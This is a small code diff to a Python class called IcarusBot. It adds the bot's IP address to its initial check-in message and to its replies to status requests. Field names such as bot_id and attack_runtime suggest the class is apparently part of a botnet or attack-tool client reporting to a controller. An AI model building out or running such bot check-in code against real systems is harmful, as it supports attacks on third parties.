@@ -98,6 +98,7 @@ class IcarusBot:
 
         # Now we notify the bot of our existence
         init_message = {
+            'ip': self.ip,
             'status': self.status,
             'id': self.bot_id,
             'runtime': self.attack_runtime,
@@ -118,6 +119,7 @@ class IcarusBot:
                 if request_type == 'status':
                     # All requests go through this response.
                     response = {
+                        'ip': self.ip,
                         'status': self.status,
                         'id': self.bot_id,
                         'runtime': self.attack_runtime,
